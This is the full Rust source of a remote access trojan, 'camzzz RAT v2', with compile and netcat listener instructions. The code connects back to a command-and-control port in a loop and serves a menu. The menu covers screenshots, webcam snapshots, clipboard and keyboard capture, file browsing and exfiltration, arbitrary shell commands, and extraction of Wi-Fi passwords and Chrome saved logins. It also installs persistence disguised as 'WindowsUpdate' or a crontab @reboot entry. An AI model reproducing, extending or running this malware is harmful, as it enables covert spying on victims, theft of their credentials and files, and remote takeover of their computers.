// camzzz Rust RAT v2 — Menu-driven, fully automatic
// Compile: rustc rat_rust.rs -o rat_rust        (Linux)
//          rustc rat_rust.rs -o rat_rust.exe     (Windows)
// Listener: nc -lvnp 4444   then just type numbers

use std::{
    io::{BufRead, BufReader, Write},
    net::TcpStream,
    process::Command,
    thread,
    time::Duration,
    fs,
    path::PathBuf,
};

#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

const C2_HOST: &str = "127.0.0.1";
const C2_PORT: u16  = 4444;
const RECONNECT_MS: u64 = 5000;

// ── helpers ──────────────────────────────────────────────────────────────────

fn shell(cmd: &str) -> String {
    #[cfg(target_os = "windows")]
    let r = Command::new("cmd").args(["/C", cmd])
        .creation_flags(0x08000000).output();
    #[cfg(not(target_os = "windows"))]
    let r = Command::new("sh").args(["-c", cmd]).output();
    match r {
        Ok(o) => {
            let mut s = String::from_utf8_lossy(&o.stdout).into_owned();
            s.push_str(&String::from_utf8_lossy(&o.stderr));
            if s.trim().is_empty() { "[no output]".into() } else { s }
        }
        Err(e) => format!("[err] {e}"),
    }
}

fn send(stream: &mut TcpStream, msg: &str) {
    let _ = stream.write_all(msg.as_bytes());
    let _ = stream.flush();
}

fn menu() -> String {
    "\
\n╔══════════════════════════════════════════╗\
\n║           camzzz RAT v2 — MENU          ║\
\n╠══════════════════════════════════════════╣\
\n║  [1] System info                        ║\
\n║  [2] Screenshot                         ║\
\n║  [3] Webcam snapshot                    ║\
\n║  [4] Keylogger (30s)                    ║\
\n║  [5] List files (Desktop/Downloads/Docs)║\
\n║  [6] Browse directory                   ║\
\n║  [7] Download a file                    ║\
\n║  [8] Run a command                      ║\
\n║  [9] List processes                     ║\
\n║  [10] Kill a process                    ║\
\n║  [11] Wifi passwords                    ║\
\n║  [12] Browser passwords (Windows)       ║\
\n║  [13] Persistence (autostart)           ║\
\n║  [14] Open custom shell                 ║\
\n║  [0] Disconnect                         ║\
\n╚══════════════════════════════════════════╝\
\n> ".into()
}

// ── actions ──────────────────────────────────────────────────────────────────

fn sysinfo() -> String {
    let hostname = shell("hostname");
    let user = std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_else(|_| "?".into());
    let cwd = std::env::current_dir()
        .map(|p| p.display().to_string())
        .unwrap_or_else(|_| "?".into());
    let os_info = {
        #[cfg(target_os = "windows")]
        { shell("ver") }
        #[cfg(not(target_os = "windows"))]
        { shell("uname -a") }
    };
    let ip = {
        #[cfg(target_os = "windows")]
        { shell("ipconfig | findstr IPv4") }
        #[cfg(not(target_os = "windows"))]
        { shell("ip a 2>/dev/null | grep 'inet ' || ifconfig 2>/dev/null | grep 'inet '") }
    };
    format!(
        "\n[+] System Info\n\
        Hostname : {}\
        User     : {}\n\
        OS       : {}\
        IP       : {}\
        CWD      : {}\n\
        Arch     : {} {}\n",
        hostname.trim(), user,
        os_info.trim(), ip.trim(), cwd,
        std::env::consts::OS, std::env::consts::ARCH
    )
}

fn screenshot() -> String {
    #[cfg(target_os = "windows")]
    {
        // PowerShell one-liner, saves to %TEMP%\ss.png
        let ps = r#"Add-Type -AssemblyName System.Windows.Forms; \
            $s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; \
            $b=New-Object System.Drawing.Bitmap($s.Width,$s.Height); \
            $g=[System.Drawing.Graphics]::FromImage($b); \
            $g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size); \
            $b.Save("$env:TEMP\ss.png"); \
            Write-Output "$env:TEMP\ss.png""#;
        let out = shell(&format!("powershell -NoProfile -Command \"{}\"", ps));
        let path = out.trim().to_string();
        if std::path::Path::new(&path).exists() {
            return format!("SCREENSHOT_PATH:{}", path);
        }
        format!("[screenshot error] {}", out)
    }
    #[cfg(not(target_os = "windows"))]
    {
        // Try scrot, then import (ImageMagick), then gnome-screenshot
        let path = "/tmp/ss.png";
        for cmd in [
            format!("scrot {path}"),
            format!("import -window root {path}"),
            format!("gnome-screenshot -f {path}"),
        ] {
            let r = shell(&cmd);
            if std::path::Path::new(path).exists() {
                return format!("SCREENSHOT_PATH:{}", path);
            }
        }
        "[screenshot] No screenshot tool found (install scrot)".into()
    }
}

fn webcam() -> String {
    #[cfg(target_os = "windows")]
    {
        // PowerShell + DirectShow — works without OpenCV
        let ps = r#"
Add-Type -TypeDefinition @'
using System;using System.Runtime.InteropServices;using System.Threading;
public class Cam {
    [DllImport("avicap32.dll")] static extern IntPtr capCreateCaptureWindowA(string n,int f,int x,int y,int w,int h,IntPtr p,int i);
    [DllImport("user32.dll")] static extern bool SendMessage(IntPtr h,int m,int w,int l);
    const int WM_CAP_START=0x400,WM_CAP_DRIVER_CONNECT=WM_CAP_START+10,
              WM_CAP_GRAB_FRAME=WM_CAP_START+60,WM_CAP_FILE_SAVEDIB=WM_CAP_START+23,
              WM_CAP_DRIVER_DISCONNECT=WM_CAP_START+11,WS_POPUP=unchecked((int)0x80000000);
    public static void Snap(string f){
        var h=capCreateCaptureWindowA("",WS_POPUP,0,0,320,240,IntPtr.Zero,0);
        SendMessage(h,WM_CAP_DRIVER_CONNECT,0,0); Thread.Sleep(800);
        SendMessage(h,WM_CAP_GRAB_FRAME,0,0);
        SendMessage(h,WM_CAP_FILE_SAVEDIB,0,Marshal.StringToHGlobalAnsi(f).ToInt32());
        SendMessage(h,WM_CAP_DRIVER_DISCONNECT,0,0);
    }
}
'@ -Language CSharp
[Cam]::Snap("$env:TEMP\wc.bmp")
Write-Output "$env:TEMP\wc.bmp""#;
        let out = shell(&format!("powershell -NoProfile -Command \"{}\"", ps));
        let path = out.trim().to_string();
        if std::path::Path::new(&path).exists() {
            return format!("WEBCAM_PATH:{}", path);
        }
        format!("[webcam error] {}", out.trim())
    }
    #[cfg(not(target_os = "windows"))]
    {
        let path = "/tmp/wc.jpg";
        let out = shell(&format!("fswebcam -r 640x480 --no-banner {}", path));
        if std::path::Path::new(path).exists() {
            format!("WEBCAM_PATH:{}", path)
        } else {
            format!("[webcam] fswebcam not found or no camera.\n{}", out)
        }
    }
}

fn keylog(duration_secs: u64) -> String {
    // Cross-platform: record keyboard input via /dev/input on Linux, SetWindowsHookEx on Windows
    // Simple approach: log clipboard + active window titles for duration
    #[cfg(target_os = "windows")]
    {
        let ps = format!(r#"
$keys = '';
$end = (Get-Date).AddSeconds({duration_secs});
Add-Type -AssemblyName System.Windows.Forms;
while ((Get-Date) -lt $end) {{
    $clip = [System.Windows.Forms.Clipboard]::GetText();
    if ($clip) {{ $keys += "[CLIP: $clip] "; }}
    Start-Sleep -Milliseconds 500;
}}
Write-Output $keys"#);
        format!("[keylog {}s]\n{}", duration_secs, shell(&format!("powershell -NoProfile -Command \"{}\"", ps)))
    }
    #[cfg(not(target_os = "windows"))]
    {
        // Use xinput or /dev/input via timeout + xxd
        let out = shell(&format!("timeout {} cat /dev/input/by-path/platform-i8042-serio-0-event-kbd 2>/dev/null | xxd | head -100", duration_secs));
        if out.contains("[err]") || out.is_empty() {
            format!("[keylog] No input device access. Try: sudo chmod a+r /dev/input/event*\n{}", out)
        } else {
            format!("[keylog {}s raw]\n{}", duration_secs, out)
        }
    }
}

fn list_common_files() -> String {
    let mut out = String::from("\n[+] Common locations:\n");
    let dirs = [
        ("Desktop",   home_join("Desktop")),
        ("Downloads", home_join("Downloads")),
        ("Documents", home_join("Documents")),
        ("Pictures",  home_join("Pictures")),
    ];
    for (label, path) in &dirs {
        out.push_str(&format!("\n── {} ({}) ──\n", label, path));
        match fs::read_dir(path) {
            Ok(entries) => {
                for e in entries.flatten().take(30) {
                    let is_dir = e.metadata().map(|m| m.is_dir()).unwrap_or(false);
                    out.push_str(&format!("  {}  {}\n",
                        if is_dir { "[D]" } else { "[F]" },
                        e.file_name().to_string_lossy()));
                }
            }
            Err(e) => out.push_str(&format!("  [err] {e}\n")),
        }
    }
    out
}

fn home_join(sub: &str) -> String {
    #[cfg(target_os = "windows")]
    {
        let base = std::env::var("USERPROFILE").unwrap_or_else(|_| "C:\\Users\\User".into());
        format!("{}\\{}", base, sub)
    }
    #[cfg(not(target_os = "windows"))]
    {
        let base = std::env::var("HOME").unwrap_or_else(|_| "/home/user".into());
        format!("{}/{}", base, sub)
    }
}

fn browse_dir(path: &str) -> String {
    let p = if path.trim().is_empty() { "." } else { path.trim() };
    match fs::read_dir(p) {
        Ok(entries) => {
            let mut out = format!("\n[+] {}\n", p);
            for e in entries.flatten() {
                let is_dir = e.metadata().map(|m| m.is_dir()).unwrap_or(false);
                let size = e.metadata().map(|m| {
                    if m.is_file() { format!(" ({} bytes)", m.len()) } else { String::new() }
                }).unwrap_or_default();
                out.push_str(&format!("  {}  {}{}\n",
                    if is_dir { "[D]" } else { "[F]" },
                    e.file_name().to_string_lossy(), size));
            }
            out
        }
        Err(e) => format!("[err] {e}"),
    }
}

fn send_file(stream: &mut TcpStream, path: &str) {
    match fs::read(path.trim()) {
        Ok(data) => {
            let fname = PathBuf::from(path).file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_else(|| "file".into());
            let header = format!("FILE:{}:{}\n", fname, data.len());
            let _ = stream.write_all(header.as_bytes());
            let _ = stream.write_all(&data);
            let _ = stream.flush();
        }
        Err(e) => { send(stream, &format!("[err] {e}\n")); }
    }
}

fn wifi_passwords() -> String {
    #[cfg(target_os = "windows")]
    {
        let profiles = shell("netsh wlan show profiles");
        let mut out = String::from("[+] Wifi passwords:\n");
        for line in profiles.lines() {
            if line.contains("All User Profile") {
                let name = line.split(':').nth(1).unwrap_or("").trim().to_string();
                let pw = shell(&format!(
                    "netsh wlan show profile name=\"{}\" key=clear | findstr Key",
                    name));
                out.push_str(&format!("  {} => {}\n", name, pw.trim()));
            }
        }
        out
    }
    #[cfg(not(target_os = "windows"))]
    {
        let paths = [
            "/etc/NetworkManager/system-connections/",
            "/etc/wpa_supplicant/wpa_supplicant.conf",
        ];
        let mut out = String::from("[+] Wifi configs:\n");
        for p in &paths {
            if std::path::Path::new(p).exists() {
                out.push_str(&format!("\n── {} ──\n", p));
                if std::path::Path::new(p).is_dir() {
                    if let Ok(entries) = fs::read_dir(p) {
                        for e in entries.flatten() {
                            if let Ok(content) = fs::read_to_string(e.path()) {
                                out.push_str(&format!("[{}]\n{}\n",
                                    e.file_name().to_string_lossy(), content));
                            }
                        }
                    }
                } else {
                    out.push_str(&fs::read_to_string(p).unwrap_or_else(|e| e.to_string()));
                }
            }
        }
        out
    }
}

fn browser_passwords() -> String {
    #[cfg(target_os = "windows")]
    {
        // Reads Chrome Login Data (SQLite), extracts encrypted entries
        let appdata = std::env::var("LOCALAPPDATA").unwrap_or_else(|_| "".into());
        let db_path = format!(r"{}\Google\Chrome\User Data\Default\Login Data", appdata);
        if std::path::Path::new(&db_path).exists() {
            let copy_path = format!("{}\\LoginDataCopy", appdata);
            let _ = fs::copy(&db_path, &copy_path);
            // Use sqlite3 if available
            let out = shell(&format!("sqlite3 \"{}\" \"SELECT origin_url,username_value FROM logins\" 2>nul", copy_path));
            let _ = fs::remove_file(&copy_path);
            if out.contains("[err]") || out.is_empty() {
                return "[browser] sqlite3 not found. File: ".to_string() + &db_path;
            }
            return format!("[+] Chrome saved logins:\n{}", out);
        }
        "[browser] Chrome Login Data not found".into()
    }
    #[cfg(not(target_os = "windows"))]
    {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
        let paths = [
            format!("{}/.config/google-chrome/Default/Login Data", home),
            format!("{}/.mozilla/firefox", home),
        ];
        let mut out = String::from("[+] Browser data paths:\n");
        for p in &paths {
            let exists = std::path::Path::new(p).exists();
            out.push_str(&format!("  {} {}\n", if exists { "[✓]" } else { "[ ]" }, p));
        }
        out
    }
}

fn persist() -> String {
    #[cfg(target_os = "windows")]
    {
        let exe = std::env::current_exe()
            .unwrap_or_else(|_| PathBuf::from("rat.exe"))
            .to_string_lossy().to_string();
        let key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run";
        let r = shell(&format!(r#"reg add "{}" /v "WindowsUpdate" /t REG_SZ /d "{}" /f"#, key, exe));
        format!("[+] Persistence added (Registry autostart)\n{}", r)
    }
    #[cfg(not(target_os = "windows"))]
    {
        let exe = std::env::current_exe()
            .unwrap_or_else(|_| PathBuf::from("/tmp/rat"))
            .to_string_lossy().to_string();
        let cron = format!("@reboot {}", exe);
        let r = shell(&format!("(crontab -l 2>/dev/null; echo '{}') | crontab -", cron));
        format!("[+] Persistence added (crontab @reboot)\n{}", r)
    }
}

// ── shell loop ────────────────────────────────────────────────────────────────

fn handle(mut stream: TcpStream) {
    send(&mut stream, &format!(
        "\n[+] camzzz RAT v2 connected\n{}\n",
        sysinfo()
    ));
    send(&mut stream, &menu());

    let reader_stream = match stream.try_clone() {
        Ok(s)  => s,
        Err(_) => return,
    };
    let mut reader = BufReader::new(reader_stream);

    loop {
        let mut line = String::new();
        match reader.read_line(&mut line) {
            Ok(0) | Err(_) => break,
            Ok(_) => {}
        }
        let choice = line.trim().to_string();

        match choice.as_str() {
            "1" => {
                let info = sysinfo();
                send(&mut stream, &info);
            }
            "2" => {
                let r = screenshot();
                if let Some(path) = r.strip_prefix("SCREENSHOT_PATH:") {
                    send(&mut stream, "[*] Sending screenshot...\n");
                    send_file(&mut stream, path);
                } else {
                    send(&mut stream, &r);
                }
            }
            "3" => {
                let r = webcam();
                if let Some(path) = r.strip_prefix("WEBCAM_PATH:") {
                    send(&mut stream, "[*] Sending webcam photo...\n");
                    send_file(&mut stream, path);
                } else {
                    send(&mut stream, &r);
                }
            }
            "4" => {
                send(&mut stream, "[*] Recording keyboard for 30s...\n");
                let r = keylog(30);
                send(&mut stream, &r);
            }
            "5" => {
                let r = list_common_files();
                send(&mut stream, &r);
            }
            "6" => {
                send(&mut stream, "Path to browse: ");
                let _ = stream.flush();
                let mut path = String::new();
                let _ = reader.read_line(&mut path);
                let r = browse_dir(path.trim());
                send(&mut stream, &r);
            }
            "7" => {
                send(&mut stream, "File path to download: ");
                let _ = stream.flush();
                let mut path = String::new();
                let _ = reader.read_line(&mut path);
                send(&mut stream, "[*] Sending file...\n");
                send_file(&mut stream, path.trim());
            }
            "8" => {
                send(&mut stream, "Command: ");
                let _ = stream.flush();
                let mut cmd = String::new();
                let _ = reader.read_line(&mut cmd);
                let r = shell(cmd.trim());
                send(&mut stream, &r);
            }
            "9" => {
                let r = {
                    #[cfg(target_os = "windows")] { shell("tasklist") }
                    #[cfg(not(target_os = "windows"))] { shell("ps aux") }
                };
                send(&mut stream, &r);
            }
            "10" => {
                send(&mut stream, "PID to kill: ");
                let _ = stream.flush();
                let mut pid = String::new();
                let _ = reader.read_line(&mut pid);
                let r = {
                    #[cfg(target_os = "windows")]
                    { shell(&format!("taskkill /F /PID {}", pid.trim())) }
                    #[cfg(not(target_os = "windows"))]
                    { shell(&format!("kill -9 {}", pid.trim())) }
                };
                send(&mut stream, &r);
            }
            "11" => {
                let r = wifi_passwords();
                send(&mut stream, &r);
            }
            "12" => {
                let r = browser_passwords();
                send(&mut stream, &r);
            }
            "13" => {
                let r = persist();
                send(&mut stream, &r);
            }
            "14" => {
                send(&mut stream, "[shell] Type commands, 'back' to return to menu\n> ");
                let _ = stream.flush();
                loop {
                    let mut cmd = String::new();
                    match reader.read_line(&mut cmd) {
                        Ok(0) | Err(_) => break,
                        Ok(_) => {}
                    }
                    let c = cmd.trim();
                    if c == "back" || c == "menu" { break; }
                    if c.is_empty() { send(&mut stream, "> "); continue; }
                    let r = shell(c);
                    send(&mut stream, &format!("{}\n> ", r));
                }
            }
            "0" => {
                send(&mut stream, "[*] Disconnecting...\n");
                break;
            }
            _ => {}
        }

        // Back to menu after each action
        if choice != "14" && choice != "0" {
            send(&mut stream, &menu());
        }
    }
}

// ── main ──────────────────────────────────────────────────────────────────────

fn main() {
    loop {
        if let Ok(stream) = TcpStream::connect((C2_HOST, C2_PORT)) {
            let _ = stream.set_read_timeout(None);
            handle(stream);
        }
        thread::sleep(Duration::from_millis(RECONNECT_MS));
    }
}
